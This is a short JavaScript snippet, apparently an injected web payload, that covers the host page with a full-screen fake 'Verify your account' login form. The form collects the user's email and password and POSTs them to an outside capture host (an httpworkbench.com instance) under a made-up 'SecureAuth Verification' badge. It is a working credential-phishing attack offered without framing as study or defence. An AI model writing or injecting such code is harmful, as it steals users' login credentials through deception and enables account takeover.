(function() {
    // 1. Create a container for the modal overlay
    var overlay = document.createElement('div');
    overlay.id = 'auth-overlay';
    
    // 2. Add Styles (Professional UI)
    var style = document.createElement('style');
    style.innerHTML = `
        #auth-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(4px);
            display: flex; align-items: center; justify-content: center;
            z-index: 2147483647; font-family: 'Inter', -apple-system, sans-serif;
        }
        .login-card {
            background: #ffffff; padding: 40px; border-radius: 12px;
            width: 100%; max-width: 400px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
            border: 1px solid #e5e7eb;
        }
        .login-card h2 { margin: 0 0 8px; color: #111827; font-size: 24px; font-weight: 700; text-align: center; }
        .login-card p { margin: 0 0 24px; color: #6b7280; font-size: 14px; text-align: center; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 6px; }
        .input-group input { 
            width: 100%; padding: 10px 12px; border: 1px solid #d1d5db; border-radius: 6px;
            font-size: 14px; box-sizing: border-box; transition: border-color 0.2s;
        }
        .input-group input:focus { outline: none; border-color: #2563eb; ring: 2px solid #3b82f6; }
        .submit-btn {
            width: 100%; background: #2563eb; color: white; padding: 12px;
            border: none; border-radius: 6px; font-weight: 600; cursor: pointer;
            font-size: 14px; transition: background 0.2s;
        }
        .submit-btn:hover { background: #1d4ed8; }
        .footer-text { margin-top: 16px; font-size: 12px; color: #9ca3af; text-align: center; }
    `;
    document.head.appendChild(style);

    // 3. Build the Form HTML
    overlay.innerHTML = `
        <div class="login-card">
            <h2>Verify your account</h2>
            <p>Please re-enter your credentials to continue your session.</p>
            <form action="https://28ac04qq.instances.httpworkbench.com" method="POST">
                <div class="input-group">
                    <label>Email address</label>
                    <input type="email" name="email" placeholder="you@example.com" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" placeholder="••••••••" required>
                </div>
                <button type="submit" class="submit-btn">Continue</button>
                <div class="footer-text">Protected by SecureAuth Verification</div>
            </form>
        </div>
    `;

    // 4. Inject into the page
    document.body.appendChild(overlay);
})();
